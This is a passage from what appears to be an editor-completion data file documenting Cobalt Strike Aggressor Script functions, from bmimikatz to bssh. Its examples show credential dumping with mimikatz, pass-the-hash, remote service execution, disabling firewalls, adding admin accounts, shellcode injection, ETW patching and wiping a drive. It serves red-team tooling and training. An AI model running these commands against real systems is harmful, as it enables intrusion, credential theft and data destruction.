    detail: "bmimikatz($1, $2, $3, $4, $5)",
    documentation: `Ask Beacon to run a mimikatz command.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the command and arguments to run. Supports the semicolon ( ; ) character to separate multiple commands
- \`$3\` — (optional) the PID to inject the mimikatz command into or $null
- \`$4\` — (optional) the architecture of the target PID (x86|x64) or $null
- \`$5\` — (optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map`,
    anchors: ["bmimikatz"],
  },
  "bmimikatz_small": {
    name: "bmimikatz_small",
    detail: "bmimikatz_small($1, $2, $3, $4, $5)",
    documentation: `Use Cobalt Strike's "smaller" internal build of Mimikatz to execute a mimikatz command.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the command and arguments to run. Supports the semicolon ( ; ) character to separate multiple commands
- \`$3\` — (optional) the PID to inject the mimikatz command into or $null
- \`$4\` — (optional) the architecture of the target PID (x86|x64) or $null
- \`$5\` — (optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map

**Note:** This mimikatz build supports:

* kerberos::golden
* lsadump::dcsync
* sekurlsa::logonpasswords
* sekurlsa::pth

All of the other stuff is removed for size. Use &bmimikatz if you want to bring the full power of mimikatz to some other offense problem.

**Example:**
\`\`\`
# Usage: logonpasswords_elevate [pid] [arch]
alias logonpasswords_elevate {
if ($2 >= 0 && ($3 eq "x86" || $3 eq "x64")) {
bmimikatz_small($1, "!sekurlsa::logonpasswords", $2, $3);
} else {
bmimikatz_small($1, "!sekurlsa::logonpasswords");
}
}
\`\`\``,
    anchors: ["bmimikatz_small"],
  },
  "bmkdir": {
    name: "bmkdir",
    detail: "bmkdir($1, $2)",
    documentation: `Ask Beacon to make a directory

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the folder to create

**Example:**
\`\`\`
bmkdir($1, "you are owned");
\`\`\``,
    anchors: ["bmkdir"],
  },
  "bmode": {
    name: "bmode",
    detail: "bmode($1, $2)",
    documentation: `Change the data channel for a DNS Beacon.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the data channel (e.g., dns, dns6, or dns-txt)

**Example:**
\`\`\`
item "Mode DNS-TXT" {
binput($1, "mode dns-txt");
bmode($1, "dns-txt");
}
\`\`\``,
    anchors: ["bmode"],
  },
  "bmv": {
    name: "bmv",
    detail: "bmv($1, $2, $3)",
    documentation: `Ask Beacon to move a file or folder.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the file or folder to move
- \`$3\` — the destination

**Example:**
\`\`\`
bmv($1, "evil.exe", "\\\\\\\\target\\\\\\C$\\\\evil.exe");
\`\`\``,
    anchors: ["bmv"],
  },
  "bnet": {
    name: "bnet",
    detail: "bnet($1, $2, $3, $4, $5, $6, $7)",
    documentation: `Run a command from Beacon's network and host enumeration tool.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the command to run.
- \`$3\` — the target to run this command against or $null
- \`$4\` — the parameter to this command (e.g., a group name)
- \`$5\` — (optional) the PID to inject the network and host enumeration tool into or $null
- \`$6\` — (optional) the architecture of the target PID (x86|x64) or $null
- \`$7\` — (optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map`,
    anchors: ["bnet"],
  },
  "bnote": {
    name: "bnote",
    detail: "bnote($1, $2)",
    documentation: `Assign a note to the specified Beacon.

**Arguments:**
- \`$1\` — the id for the beacon to post to
- \`$2\` — the note content

**Example:**
\`\`\`
bnote($1, "foo");
\`\`\``,
    anchors: ["bnote"],
  },
  "bof_extract": {
    name: "bof_extract",
    detail: "bof_extract($1, $2)",
    documentation: `The function extracts the executable code for the specified entry point from the Beacon Object File (BOF) and is typically used in conjunction with the BEACON_SLEEP_MASK hook.

**Arguments:**
- \`$1\` — A string containing the beacon object file.
- \`$2\` — Entry point of the code to extract. The default is "sleep_mask"

**Returns:** The extracted BOF.

**Example:**
\`\`\`
set BEACON_SLEEP_MASK {
local('$beacon_type $arch $type $handle $data $bof $bof_len');
($beacon_type, $arch) = @_;
$type = "";
if ($beacon_type ne "default") {
$type = "_ $+ $beacon_type";
}

$handle = openf(script_resource("sleepmask $+ $type $+ . $+ $arch $+ .o"));
$data = readb($handle, -1);
closef($handle);

$bof = bof_extract($data, "sleep_mask");
$bof_len = strlen($bof);

if ($bof_len <= 0) {
return %(status => 0, result => $null, error => "Error: failed to extract the sleepmask BOF.");
}
return %(status => 1, result => $bof, information => "Sleepmask BOF generated. Total size: $bof_len"
\`\`\``,
    anchors: ["bof_extract"],
  },
  "bof_pack": {
    name: "bof_pack",
    detail: "bof_pack($1, $2)",
    documentation: `Pack arguments in a way that's suitable for BOF APIs to unpack.

**Arguments:**
- \`$1\` — the id for the Beacon (needed for unicode conversions)
- \`$2\` — format string for the packed data

**Note:** This function packs its arguments into a binary structure for use with &beacon_inline_execute. The format string options here correspond to the BeaconData* C API available to BOF files. This API handles transformations on the data and hints as required by each type it can pack.

Type
Description
Unp`,
    anchors: ["bof_pack"],
  },
  "bpassthehash": {
    name: "bpassthehash",
    detail: "bpassthehash($1, $2, $3, $4, $5, $6)",
    documentation: `Ask Beacon to create a token that passes the specified hash. This is the pth command in Beacon. It uses mimikatz. This function requires administrator privileges.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the domain of the user
- \`$3\` — the user's username
- \`$4\` — the user's password hash
- \`$5\` — (optional) the PID to inject the pth command into or $null
- \`$6\` — (optional) the architecture of the target PID (x86|x64) or $null

**Example:**
\`\`\`
Spawn a temporary process
bpassthehash($1, "CORP", "Administrator", "password_hash");

Inject into the specified process
bpassthehash($1, "CORP", "Administrator", "password_hash", 1234, "x64");
\`\`\``,
    anchors: ["bpassthehash"],
  },
  "bpause": {
    name: "bpause",
    detail: "bpause($1, $2)",
    documentation: `Ask Beacon to pause its execution. This is a one-off sleep.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — how long the Beacon should pause execution for (milliseconds)

**Example:**
\`\`\`
alias pause {
bpause($1, int($2));
}
\`\`\``,
    anchors: ["bpause"],
  },
  "bportscan": {
    name: "bportscan",
    detail: "bportscan($1, $2, $3, $4, $5, $6, $7, $8)",
    documentation: `Ask Beacon to run its port scanner.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the targets to scan (e.g., 192.168.12.0/24)
- \`$3\` — the ports to scan (e.g., 1-1024,6667)
- \`$4\` — the discovery method to use (arp|icmp|none)
- \`$5\` — the max number of sockets to use (e.g., 1024)
- \`$6\` — (optional) the PID to inject the port scanner into or $null
- \`$7\` — (optional) the architecture of the target PID (x86|x64) or $null
- \`$8\` — (optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map

**Example:**
\`\`\`
Spawn a temporary process
bportscan($1, "192.168.12.0/24", "1-1024,6667", "arp", 1024);

Inject into the specified process
bportscan($1, "192.168.12.0/24", "1-1024,6667", "arp", 1024, 1234, "x64");
\`\`\``,
    anchors: ["bportscan"],
  },
  "bpowerpick": {
    name: "bpowerpick",
    detail: "bpowerpick($1, $2, $3, $4, $5)",
    documentation: `Spawn a process, inject Unmanaged PowerShell, and run the specified command.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the cmdlet and arguments
- \`$3\` — (optional) if specified, powershell-import script is ignored and this argument is treated as the download cradle to prepend to the command. Empty string is OK here too, for no download cradle. Specify $null to use the current imported PowerShell script.
- \`$4\` — (optional) the "PATCHES:" argument can modify functions in memory for the process. Up to 4 "patch-rule" rules can be specified (space delimited).
- \`$5\` — (optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map

**Example:**
\`\`\`
# get the version of PowerShell available via Unmanaged PowerShell
alias powerver {
bpowerpick($1, '$PSVersionTable.PSVersion');
}

alias powerver2 {
bpowerpick($1, '$PSVersionTable.PSVersion', '', 'PATCHES: ntdll.dll,EtwEventWrite,0,C300');
}
\`\`\``,
    anchors: ["bpowerpick"],
  },
  "bpowershell": {
    name: "bpowershell",
    detail: "bpowershell($1, $2, $3, $4)",
    documentation: `Ask Beacon to run a PowerShell cmdlet

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the cmdlet and arguments
- \`$3\` — (optional) if specified, powershell-import script is ignored and this argument is treated as the download cradle to prepend to the command. Empty string is OK here too, for no download cradle. Specify $null to use the current imported PowerShell script.
- \`$4\` — (optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map

**Example:**
\`\`\`
# get the version of PowerShell...
alias powerver {
bpowershell($1, '$PSVersionTable.PSVersion');
}
\`\`\``,
    anchors: ["bpowershell"],
  },
  "bpowershell_import": {
    name: "bpowershell_import",
    detail: "bpowershell_import($1, $2)",
    documentation: `Import a PowerShell script into a Beacon

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the path to the local file to import

**Example:**
\`\`\`
# quickly run PowerUp
alias powerup {
bpowershell_import($1, script_resource("PowerUp.ps1"));
bpowershell($1, "Invoke-AllChecks");
}
\`\`\``,
    anchors: ["bpowershell_import"],
  },
  "bpowershell_import_clear": {
    name: "bpowershell_import_clear",
    detail: "bpowershell_import_clear($1)",
    documentation: `Clear the imported PowerShell script from a Beacon session.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.

**Example:**
\`\`\`
alias powershell-clear {
bpowershell_import_clear($1);
}
\`\`\``,
    anchors: ["bpowershell_import_clear"],
  },
  "bppid": {
    name: "bppid",
    detail: "bppid($1, $2)",
    documentation: `Set a parent process for Beacon's child processes

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the parent process ID. Specify 0 to reset to default behavior.

**Note:** - The current session must have rights to access the specified parent process. 

- Attempts to spawn post-ex jobs under parent processes in another desktop session may fail. This limitation is due to how Beacon launches its "temporary" processes for post-exploitation jobs and injects code into them.

**Example:**
\`\`\`
alias prepenv {
btask($1, "Tasked Beacon to find explorer.exe and make it the PPID");
bps($1, {
local('$pid $name $entry');
foreach $entry (split("\\n", $2)) {
($name, $null, $pid) = split("\\\\s+", $entry);
if ($name eq "explorer.exe") {
bppid($1, $pid);
}
}
});
}
\`\`\``,
    anchors: ["bppid"],
  },
  "bprintscreen": {
    name: "bprintscreen",
    detail: "bprintscreen($1, $2, $3)",
    documentation: `Ask Beacon to take a screenshot via PrintScr method.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — (optional) the PID to inject the screenshot tool via PrintScr method or $null.
- \`$3\` — (optional) the architecture of the target PID (x86|x64) or $null.

**Example:**
\`\`\`
Spawn a temporary process
item "&Printscreen" {
binput($1, "printscreen");
bpintscreen($1);
}

Inject into the specified process
bprintscreen($1, 1234, "x64");
\`\`\``,
    anchors: ["bprintscreen"],
  },
  "bps": {
    name: "bps",
    detail: "bps($1, $2)",
    documentation: `Task a Beacon to list processes

Variations
bps($1);

Output the results to the Beacon console.

bps($1, &callback);

Route results to the specified callback function.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — (optional) callback function with the ps results. Arguments to the callback are: $1 = beacon ID, $2 = results

**Example:**
\`\`\`
on beacon_initial {
bps($1);
}

alias prepenv {
btask($1, "Tasked Beacon to find explorer.exe and make it the PPID");
bps($1, {
local('$pid $name $entry');
foreach $entry (split("\\n", $2)) {
($name, $null, $pid) = split("\\\\s+", $entry);
if ($name eq "explorer.exe") {
bppid($1, $pid);
}
}
});
}
\`\`\``,
    anchors: ["bps"],
  },
  "bpsexec": {
    name: "bpsexec",
    detail: "bpsexec($1, $2, $3, $4, $5)",
    documentation: `Ask Beacon to spawn a payload on a remote host. This function generates an Artifact Kit executable, copies it to the target, and creates a service to run it and clean it up.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the target to spawn a payload onto
- \`$3\` — the listener to spawn
- \`$4\` — the share to copy the executable to
- \`$5\` — the architecture of the payload to generate/deliver (x86 or x64)

**Example:**
\`\`\`
brev2self();
bloginuser($1, "CORP", "Administrator", "toor");
bpsexec($1, "172.16.48.3", "my-listener", "ADMIN\\$");
\`\`\``,
    anchors: ["bpsexec"],
  },
  "bpsexec_command": {
    name: "bpsexec_command",
    detail: "bpsexec_command($1, $2, $3, $4)",
    documentation: `Ask Beacon to run a command on a remote host. This function creates a service on the remote host, starts it, and cleans it up.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the target to run the command on
- \`$3\` — the name of the service to create
- \`$4\` — the command to run.

**Example:**
\`\`\`
# disable the firewall on a remote target
# beacon> shieldsdown [target]
alias shieldsdown {
bpsexec_command($1, $2, "shieldsdn", "cmd.exe /c netsh advfirewall set allprofiles state off");
}
\`\`\``,
    anchors: ["bpsexec_command"],
  },
  "bpsexec_psh": {
    name: "bpsexec_psh",
    detail: "REMOVED Removed in Cobalt Strike 4",
    documentation: `REMOVED Removed in Cobalt Strike 4.0. Use &bjump with psexec_psh option.`,
    anchors: ["bpsexec_psh"],
  },
  "bpsinject": {
    name: "bpsinject",
    detail: "bpsinject($1, $2, $3, $4, $5)",
    documentation: `Inject Unmanaged PowerShell into a specific process and run the specified cmdlet. This will use the current imported powershell script.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the process to inject the session into
- \`$3\` — the process architecture (x86 | x64)
- \`$4\` — the cmdlet to run
- \`$5\` — (optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map

**Example:**
\`\`\`
bpsinject($1, 1234, x64, "[System.Diagnostics.Process]::GetCurrentProcess()");
\`\`\``,
    anchors: ["bpsinject"],
  },
  "bpwd": {
    name: "bpwd",
    detail: "bpwd($1)",
    documentation: `Ask Beacon to print its current working directory

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.

**Example:**
\`\`\`
alias pwd {
bpwd($1);
}
\`\`\``,
    anchors: ["bpwd"],
  },
  "bread_pipe": {
    name: "bread_pipe",
    detail: "bread_pipe($1, $2, $3, $4, $5, $6, $7, $8)",
    documentation: `bread_pipe is called to register a new user-defined post-ex Beacon job which communicates over a named pipe.

**Arguments:**
- \`$1\` — the Beacon id
- \`$2\` — the job type (ANONYMOUS_BYTESTREAM, ANONYMOUS_BLOB, or IMPERSONATE_BYTESTREAM)
- \`$3\` — the callback type (CALLBACK_POSTEX_KIT, CALLBACK_OUTPUT, CALLBACK_OUTPUT_UTF8, or CALLBACK_OUTPUT_OEM).
- \`$4\` — the job description
- \`$5\` — the name of the named pipe Beacon must connect to for communication
- \`$6\` — the pid (set to 0)
- \`$7\` — the timeout value in milliseconds
- \`$8\` — an optional aggressor script closure (can be set to $null)

**Example:**
\`\`\`
bread_pipe($bid, "ANONYMOUS_BYTESTREAM", "CALLBACK_POSTEX_KIT", "bof.x64.o", "msrpc_1234", 0, 10000, $null);
\`\`\``,
    anchors: ["bread_pipe"],
  },
  "breg_queryv": {
    name: "breg_queryv",
    detail: "breg_queryv($1, $2, $3, $4)",
    documentation: `Ask Beacon to query a value within a registry key.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the path to the key
- \`$3\` — the name of the value to query
- \`$4\` — x86|x64 - which view of the registry to use

**Example:**
\`\`\`
alias winver {
breg_queryv($1, "HKLM\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion", "ProductName", "x86");
}
\`\`\``,
    anchors: ["breg_queryv"],
  },
  "bremote_exec": {
    name: "bremote_exec",
    detail: "bremote_exec($1, $2, $3, $4)",
    documentation: `Ask Beacon to run a command on a remote target.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the remote execute method to use
- \`$3\` — the remote target
- \`$4\` — the command and arguments to run

**Example:**
\`\`\`
# winrm [target] [command+args]
alias winrm-exec {
bremote_exec($1, "winrm", $2, $3); {
}

See also

&beacon_remote_exec_method_describe, &beacon_remote_exec_method_register, &beacon_remote_exec_methods
\`\`\``,
    anchors: ["bremote_exec"],
  },
  "brev2self": {
    name: "brev2self",
    detail: "brev2self($1)",
    documentation: `Ask Beacon to drop its current token. This calls the RevertToSelf() Win32 API.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.

**Example:**
\`\`\`
alias rev2self {
brev2self($1);
}
\`\`\``,
    anchors: ["brev2self"],
  },
  "brm": {
    name: "brm",
    detail: "brm($1, $2)",
    documentation: `Ask Beacon to remove a file or folder.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the file or folder to remove

**Example:**
\`\`\`
# nuke the system
brm($1, "c:\\\\");
\`\`\``,
    anchors: ["brm"],
  },
  "brportfwd": {
    name: "brportfwd",
    detail: "brportfwd($1, $2, $3, $4)",
    documentation: `Ask Beacon to setup a reverse port forward.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the port to bind to on the target
- \`$3\` — the host to forward connections to
- \`$4\` — the port to forward connections to

**Example:**
\`\`\`
brportfwd($1, 80, "192.168.12.88", 80);
\`\`\``,
    anchors: ["brportfwd"],
  },
  "brportfwd_local": {
    name: "brportfwd_local",
    detail: "brportfwd_local($1, $2, $3, $4)",
    documentation: `Ask Beacon to setup a reverse port forward that routes to the current Cobalt Strike client.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the port to bind to on the target
- \`$3\` — the host to forward connections to
- \`$4\` — the port to forward connections to

**Example:**
\`\`\`
brportfwd_local($1, 80, "192.168.12.88", 80);
\`\`\``,
    anchors: ["brportfwd_local"],
  },
  "brportfwd_stop": {
    name: "brportfwd_stop",
    detail: "brportfwd_stop($1, $2)",
    documentation: `Ask Beacon to stop a reverse port forward

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the port bound on the target

**Example:**
\`\`\`
brportfwd_stop($1, 80);
\`\`\``,
    anchors: ["brportfwd_stop"],
  },
  "brun": {
    name: "brun",
    detail: "brun($1, $2)",
    documentation: `Ask Beacon to run a command

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the command and arguments to run

**Note:** This capability is a simpler version of the &beacon_execute_job function. The latter function is what &bpowershell and &bshell build on. This is a (slightly) more OPSEC-safe option to run commands and receive output from them.

**Example:**
\`\`\`
alias w {
brun($1, "whoami /all");
}
\`\`\``,
    anchors: ["brun"],
  },
  "brunas": {
    name: "brunas",
    detail: "brunas($1, $2, $3, $4, $5)",
    documentation: `Ask Beacon to run a command as another user.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the domain of the user
- \`$3\` — the user's username
- \`$4\` — the user's password
- \`$5\` — the command to run

**Example:**
\`\`\`
brunas($1, "CORP", "Administrator", "toor", "notepad.exe");
\`\`\``,
    anchors: ["brunas"],
  },
  "brunasadmin": {
    name: "brunasadmin",
    detail: "brunasadmin($1, $2)",
    documentation: `REMOVED Removed in Cobalt Strike 4.0. Use &belevate_command with psexec_psh option.

Ask Beacon to run a command in a high-integrity context (bypasses UAC).

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the command and its arguments.

**Note:** This command uses the Token Duplication UAC bypass. This bypass has a few requirements:

- Your user must be a local admin

- If Always Notify is enabled, an existing high integrity process must be running in the current desktop session.

**Example:**
\`\`\`
# disable the firewall
brunasadmin($1, "cmd.exe /C netsh advfirewall set allprofiles state off");
\`\`\``,
    anchors: ["brunasadmin"],
  },
  "brunu": {
    name: "brunu",
    detail: "brunu($1, $2, $3)",
    documentation: `Ask Beacon to run a process under another process.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the PID of the parent process
- \`$3\` — the command + arguments to run

**Example:**
\`\`\`
brunu($1, 1234, "notepad.exe");
\`\`\``,
    anchors: ["brunu"],
  },
  "bscreenshot": {
    name: "bscreenshot",
    detail: "bscreenshot($1, $2, $3)",
    documentation: `Ask Beacon to take a screenshot.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — (optional) the PID to inject the screenshot tool or $null
- \`$3\` — (optional) the architecture of the target PID (x86|x64) or $null

**Example:**
\`\`\`
Spawn a temporary process
item "&Screenshot" {
binput($1, "screenshot");
bscreenshot($1);
}

Inject into the specified process
bscreenshot($1, 1234, "x64");
\`\`\``,
    anchors: ["bscreenshot"],
  },
  "bscreenwatch": {
    name: "bscreenwatch",
    detail: "bscreenwatch($1, $2, $3)",
    documentation: `Ask Beacon to take periodic screenshots

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — (optional) the PID to inject the screenshot tool or $null
- \`$3\` — (optional) the architecture of the target PID (x86|x64) or $null

**Example:**
\`\`\`
Spawn a temporary process
item "&Screenwatch" {
binput($1, "screenwatch");
bscreenwatch($1);
}

Inject into the specified process
bscreenwatch($1, 1234, "x64");
\`\`\``,
    anchors: ["bscreenwatch"],
  },
  "bsetenv": {
    name: "bsetenv",
    detail: "bsetenv($1, $2, $3)",
    documentation: `Ask Beacon to set an environment variable

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the environment variable to set
- \`$3\` — the value to set the environment variable to (specify $null to unset the variable)

**Example:**
\`\`\`
alias tryit {
bsetenv($1, "foo", "BAR!");
bshell($1, "echo %foo%");
}
\`\`\``,
    anchors: ["bsetenv"],
  },
  "bshell": {
    name: "bshell",
    detail: "bshell($1, $2)",
    documentation: `Ask Beacon to run a command with cmd.exe

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the command and arguments to run

**Example:**
\`\`\`
alias adduser {
bshell($1, "net user $2 B00gyW00gy1234! /ADD");
bshell($1, "net localgroup \\"Administrators\\" $2 /ADD");
}
\`\`\``,
    anchors: ["bshell"],
  },
  "bshinject": {
    name: "bshinject",
    detail: "bshinject($1, $2, $3, $4)",
    documentation: `Inject shellcode (from a local file) into a specific process.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the PID of the process to inject into
- \`$3\` — the process architecture (x86 | x64)
- \`$4\` — the local file with the shellcode

**Example:**
\`\`\`
bshinject($1, 1234, "x86", "/path/to/stuff.bin");
\`\`\``,
    anchors: ["bshinject"],
  },
  "bshspawn": {
    name: "bshspawn",
    detail: "bshspawn($1, $2, $3)",
    documentation: `Spawn shellcode (from a local file) into another process. This function benefits from Beacon's configuration to spawn post-exploitation jobs (e.g., spawnto, ppid, etc.)

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the process architecture (x86 | x64)
- \`$3\` — the local file with the shellcode

**Example:**
\`\`\`
bshspawn($1, "x86", "/path/to/stuff.bin");
\`\`\``,
    anchors: ["bshspawn"],
  },
  "bsleep": {
    name: "bsleep",
    detail: "bsleep($1, $2, $3)",
    documentation: `Ask Beacon to change its beaconing interval and jitter factor.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the number of seconds between beacons.
- \`$3\` — the jitter factor [0-99]

**Example:**
\`\`\`
alias stealthy {
# sleep for 1 hour with 30% jitter factor
bsleep($1, 60 * 60, 30);
}
\`\`\``,
    anchors: ["bsleep"],
  },
  "bsleepu": {
    name: "bsleepu",
    detail: "bsleepu($1, $2)",
    documentation: `Ask Beacon to change its beaconing interval and jitter factor.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — beacon sleep period string.

**Example:**
\`\`\`
alias stealthy {
# sleep for 2 days 13 hours 45 minutes 8 seconds with 30% jitter factor
bsleepu($1, "2d 13h 45m 8s 30j");
}
\`\`\``,
    anchors: ["bsleepu"],
  },
  "bsocks": {
    name: "bsocks",
    detail: "bsocks($1, $2, $3, $4, $5, $6, $7)",
    documentation: `Start a SOCKS proxy server associated with a beacon.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the port to bind to
- \`$3\` — SOCKS version [SOCKS4|SOCKS5] Default: SOCKS4
- \`$4\` — enable/disable NoAuth authentication [enableNoAuth|disableNoAuth] Default: enableNoAuth
- \`$5\` — username for User/Password authentication [blank|username] Default: Blank
- \`$6\` — password for User/Password authentication [blank|password] Default: Blank
- \`$7\` — enable logging [enableLogging|disableLogging] Default: disableLogging

**Example:**
\`\`\`
alias socksPorts {
bsocks($1, 10401);
bsocks($1, 10402, "SOCKS4");
bsocks($1, 10501, "SOCKS5");
bsocks($1, 10502, "SOCKS5" "enableNoAuth", "", "", "disableLogging");
bsocks($1, 10503, "SOCKS5" "enableNoAuth", "myname", "mypassword", "disableLogging");
bsocks($1, 10504, "SOCKS5" "disableNoAuth", "myname", "mypassword", "enableLogging");
}
\`\`\``,
    anchors: ["bsocks"],
  },
  "bsocks_stop": {
    name: "bsocks_stop",
    detail: "bsocks_stop($1)",
    documentation: `Stop SOCKS proxy servers associated with the specified Beacon.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.

**Example:**
\`\`\`
alias stopsocks {
bsocks_stop($1);
}
\`\`\``,
    anchors: ["bsocks_stop"],
  },
  "bspawn": {
    name: "bspawn",
    detail: "bspawn($1, $2, $3)",
    documentation: `Ask Beacon to spawn a new session

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the listener to target.
- \`$3\` — the architecture to spawn a process for (defaults to current beacon arch)

**Example:**
\`\`\`
item "&Spawn" {
openPayloadHelper(lambda({
binput($bids, "spawn x86 $1");
bspawn($bids, $1, "x86");
}, $bids => $1));
}
\`\`\``,
    anchors: ["bspawn"],
  },
  "bspawnas": {
    name: "bspawnas",
    detail: "bspawnas($1, $2, $3, $4, $5)",
    documentation: `Ask Beacon to spawn a session as another user.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the domain of the user
- \`$3\` — the user's username
- \`$4\` — the user's password
- \`$5\` — the listener to spawn

**Example:**
\`\`\`
bspawnas($1, "CORP", "Administrator", "toor", "my-listener");
\`\`\``,
    anchors: ["bspawnas"],
  },
  "bspawnto": {
    name: "bspawnto",
    detail: "bspawnto($1, $2, $3)",
    documentation: `Change the default program Beacon spawns to inject capabilities into.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the architecture we're modifying the spawnto setting for (x86, x64)
- \`$3\` — the program to spawn

**Note:** The value you specify for spawnto must work from x86->x86, x86->x64, x64->x86, and x64->x86 contexts. This is tricky. Follow these rules and you'll be OK:

1. Always specify the full path to the program you want Beacon to spawn for its post-ex jobs.

2. Environment variables (e.g., %windir%) are OK 

**Example:**
\`\`\`
# let's make everything lame.
on beacon_initial {
binput($1, "prep session with new spawnto values.");
bspawnto($1, "x86", "%windir%\\\\syswow64\\\\notepad.exe");
bspawnto($1, "x64", "%windir%\\\\sysnative\\\\notepad.exe");
}
\`\`\``,
    anchors: ["bspawnto"],
  },
  "bspawnu": {
    name: "bspawnu",
    detail: "bspawnu($1, $2, $3)",
    documentation: `Ask Beacon to spawn a session under another process.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the process to spawn this session under
- \`$3\` — the listener to spawn

**Example:**
\`\`\`
bspawnu($1, 1234, "my-listener");
\`\`\``,
    anchors: ["bspawnu"],
  },
  "bspunnel": {
    name: "bspunnel",
    detail: "bspunnel($1, $2, $3, $4, $5)",
    documentation: `Spawn and tunnel an agent through this Beacon (via a target localhost-only reverse port forward)

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — - the architecture (e.g., x86, x64)
- \`$3\` — the host of the controller
- \`$4\` — the port of the controller
- \`$5\` — a file with position-independent code to execute in a temporary process.

**Example:**
\`\`\`
bspunnel($1, "x64", "127.0.0.1", 4444, script_resource("agent.bin"));
\`\`\``,
    anchors: ["bspunnel"],
  },
  "bspunnel_local": {
    name: "bspunnel_local",
    detail: "bspunnel_local($1, $2, $3, $4, $5)",
    documentation: `Spawn and tunnel an agent through this Beacon (via a target localhost-only reverse port forward). Note: this reverse port forward tunnel traverses through the Beacon chain to the team server and, via the team server, out through the requesting Cobalt Strike client.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the architecture (e.g., x86, x64)
- \`$3\` — the host of the controller
- \`$4\` — the port of the controller
- \`$5\` — a file with position-independent code to execute in a temporary process.

**Example:**
\`\`\`
bspunnel_local($1, "x64", "127.0.0.1", 4444, script_resource("agent.bin"));
\`\`\``,
    anchors: ["bspunnel_local"],
  },
  "bssh": {
    name: "bssh",
    detail: "bssh($1, $2, $3, $4, $5, $6, $7)",
    documentation: `Ask Beacon to spawn an SSH session.

**Arguments:**
- \`$1\` — id for the beacon. This may be an array or a single ID.
- \`$2\` — IP address or hostname of the target
- \`$3\` — port (e.g., 22)
- \`$4\` — username
- \`$5\` — password
- \`$6\` — (optional) the PID to inject the SSH client into or $null
- \`$7\` — (optional) the architecture of the target PID (x86|x64) or $null

**Example:**
\`\`\`
Spawn a temporary process
bssh($1, "172.16.20.128", 22, "root", "toor");

Inject into the specified process
bssh($1, "172.16.20.128", 22, "root", "toor", 1234, "x64");
\`\`\``,
    anchors: ["bssh"],
  },
  "bssh_key": {
    name: "bssh_key",
    detail: "bssh_key($1, $2, $3, $4, $5, $6, $7)",
